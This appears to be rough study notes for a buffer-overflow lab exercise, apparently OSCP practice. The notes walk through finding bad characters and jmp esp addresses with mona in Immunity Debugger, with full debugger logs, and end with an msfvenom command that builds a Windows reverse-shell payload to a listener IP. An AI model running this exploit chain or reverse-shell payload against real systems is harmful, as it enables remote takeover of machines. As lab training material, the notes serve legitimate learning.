00 07 08 2e 2f a0 a1 

false positives given by mona plugin give just one extra

00 , 07 , 2e and a0 are bad chars but we are not sure about the other chars that mona give 
so just to verify remove these chars (x07, x2e ,xa0) one by one from exploit.py and run the exploit 

and check again the output by running this cmd

!mona compare -f C:\mona\oscp\bytearray.bin -a 

if we get 08 2f and a1 or any of them then mona was right and if we dont get these then mona was fuck all person 


!mona bytearray -b "\x00"          
at first you made the whole file of bad chars using mona inside immunity debugger

python3 exploit2.py
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
after running exploit2 your application will crash 

!mona jmp -r esp -cpb "\x00"
run the cmd of mona comparing bad chars in the crashed application which will soon give you jump esp

or what you can do is at first run the cmd of making whole file of bad chars using mona inside immunity debugger and after that in similar running state run the second commmand of finding jump esp






after this we when we get jump esp value let me show u how it will look

Log data
Address    Message
           Immunity Debugger 1.85.0.0 : R'lyeh
           Need support? visit http://forum.immunityinc.com/
           "C:\Users\admin\Desktop\vulnerable-apps\oscp\oscp.exe"

           Console file 'C:\Users\admin\Desktop\vulnerable-apps\oscp\oscp.exe'
           [05:26:38] New process with ID 00000910 created
004012D0   Main thread with ID 00000B1C created
00400000   Modules C:\Users\admin\Desktop\vulnerable-apps\oscp\oscp.exe
62500000   Modules C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll
75C40000   Modules C:\Windows\system32\KERNELBASE.dll
76440000   Modules C:\Windows\system32\RPCRT4.dll
76500000   Modules C:\Windows\system32\kernel32.dll
76960000   Modules C:\Windows\system32\WS2_32.dll
769A0000   Modules C:\Windows\system32\msvcrt.dll
77840000   Modules C:\Windows\SYSTEM32\ntdll.dll
779E0000   Modules C:\Windows\system32\NSI.dll
004012D0   [05:26:39] Program entry point
753D0000   Modules C:\Windows\system32\mswsock.dll
75C90000   Modules C:\Windows\system32\user32.dll
75D60000   Modules C:\Windows\system32\GDI32.dll
767C0000   Modules C:\Windows\system32\LPK.dll
765E0000   Modules C:\Windows\system32\USP10.dll
767D0000   Modules C:\Windows\system32\IMM32.DLL
760D0000   Modules C:\Windows\system32\MSCTF.dll
0BADF00D   [+] Command used:
0BADF00D   !mona bytearray -b "\x00"
0BADF00D    *** Note: parameter -b has been deprecated and replaced with -cpb ***
0BADF00D   Generating table, excluding 1 bad chars...
0BADF00D   Dumping table to file
0BADF00D   [+] Preparing output file 'bytearray.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\bytearray.txt
           "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
           "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
           "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
           "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
           "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
           "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
           "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
           "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

0BADF00D
0BADF00D   Done, wrote 255 bytes to file c:\mona\oscp\bytearray.txt
0BADF00D   Binary output saved in c:\mona\oscp\bytearray.bin
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.031000
00401973   New thread with ID 00000FA8 created
42424242   [05:35:55] Access violation when executing [42424242]
0BADF00D   [+] Command used:
0BADF00D   !mona compare -f C:\mona\oscp\bytearray.bin -a esp
0BADF00D   [+] Reading file C:\mona\oscp\bytearray.bin...
0BADF00D       Read 255 bytes from file
0BADF00D   [+] Preparing output file 'compare.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\compare.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] C:\mona\oscp\bytearray.bin has been recognized as RAW bytes.
0BADF00D   [+] Fetched 255 bytes successfully from C:\mona\oscp\bytearray.bin
0BADF00D       - Comparing 1 location(s)
0BADF00D   Comparing bytes from file with memory :
018BFA30   [+] Comparing with memory at location : 0x018bfa30 (Stack)
018BFA30   Only 249 original bytes of 'normal' code found.
018BFA30       ,-----------------------------------------------.
018BFA30       | Comparison results:                           |
018BFA30       |-----------------------------------------------|
018BFA30     0 |01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10| File
018BFA30       |                  0a 0d                        | Memory
018BFA30    10 |11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20| File
018BFA30       |                                               | Memory
018BFA30    20 |21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30| File
018BFA30       |                                       0a 0d   | Memory
018BFA30    30 |31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40| File
018BFA30       |                                               | Memory
018BFA30    40 |41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50| File
018BFA30       |                                               | Memory
018BFA30    50 |51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60| File
018BFA30       |                                               | Memory
018BFA30    60 |61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70| File
018BFA30       |                                               | Memory
018BFA30    70 |71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80| File
018BFA30       |                                               | Memory
018BFA30    80 |81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90| File
018BFA30       |                                               | Memory
018BFA30    90 |91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0| File
018BFA30       |                                             0a| Memory
018BFA30    a0 |a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0| File
018BFA30       |0d                                             | Memory
018BFA30    b0 |b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0| File
018BFA30       |                                               | Memory
018BFA30    c0 |c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0| File
018BFA30       |                                               | Memory
018BFA30    d0 |d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0| File
018BFA30       |                                               | Memory
018BFA30    e0 |e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0| File
018BFA30       |                                               | Memory
018BFA30    f0 |f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff   | File
018BFA30       |                                               | Memory
018BFA30       `-----------------------------------------------'
018BFA30
018BFA30                   | File              | Memory            | Note
018BFA30   ---------------------------------------------------------------------
018BFA30   0   0   6   6   | 01 02 03 04 05 06 | 01 02 03 04 05 06 | unmodified!
018BFA30   6   6   2   2   | 07 08             | 0a 0d             | corrupted
018BFA30   8   8   37  37  | 09 ... 2d         | 09 ... 2d         | unmodified!
018BFA30   45  45  2   2   | 2e 2f             | 0a 0d             | corrupted
018BFA30   47  47  112 112 | 30 ... 9f         | 30 ... 9f         | unmodified!
018BFA30   159 159 2   2   | a0 a1             | 0a 0d             | corrupted
018BFA30   161 161 94  94  | a2 ... ff         | a2 ... ff         | unmodified!
018BFA30   ---------------------------------------------------------------------
018BFA30
018BFA30   Possibly bad chars: 07 08 2e 2f a0 a1
018BFA30   Bytes omitted from input: 00
018BFA30
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.686000
0BADF00D   [+] Command used:
0BADF00D   !mona jmp -r esp -cpb "\x00"

           ---------- Mona command started on 2022-04-02 05:37:31 (v2.0, rev 605) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Bad char filter will be applied to pointers : "\x00"
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 2 modules
0BADF00D       - Querying module essfunc.dll
74F20000   Modules C:\Windows\System32\wshtcpip.dll
0BADF00D       - Querying module oscp.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\jmp.txt
0BADF00D   [+] Writing results to c:\mona\oscp\jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 9
0BADF00D   [+] Results :




62 50 11 af since most os use little endianess you have to give this form opposite direction




625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0 (C\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
625011BB     0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
625011C7     0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
625011D3     0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
625011DF     0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
625011EB     0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
625011F7     0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
62501203     0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
62501205     0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
0BADF00D       Found a total of 9 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:01.342000





run this cmd to get payload remove b from starting of every line
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.58.116 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py



